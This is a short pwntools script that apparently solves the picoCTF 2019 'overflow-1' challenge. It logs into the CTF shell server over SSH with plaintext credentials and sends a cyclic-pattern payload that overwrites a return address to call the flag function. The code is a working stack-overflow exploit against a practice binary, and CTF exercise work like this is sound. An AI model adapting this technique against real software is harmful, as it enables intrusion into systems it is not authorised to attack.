from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

random_str = cyclic(100)
addressOfFlagFxn = b'\xe6\x85\x04\x08'  # got 0x080485e6 using radare2 and opening a visual form of the binary
payload = random_str.replace(b'taaa', addressOfFlagFxn)  # got b'taaa' by overflowing buffer and seeing return address

# p = session.process('ls -l /problems/overflow-1_2_305519bf80dcdebd46c8950854760999', shell=True)

# session.download_file('/problems/overflow-1_2_305519bf80dcdebd46c8950854760999')

program = session.process(['./vuln'], cwd='/problems/overflow-1_2_305519bf80dcdebd46c8950854760999')

program.recvline()
program.sendline(payload)
program.recvline()

flagInB = program.recv()
flag = flagInB.decode('ascii')
rawFlag = flag[flag.index('{')+1:flag.index('}')]

print(rawFlag)
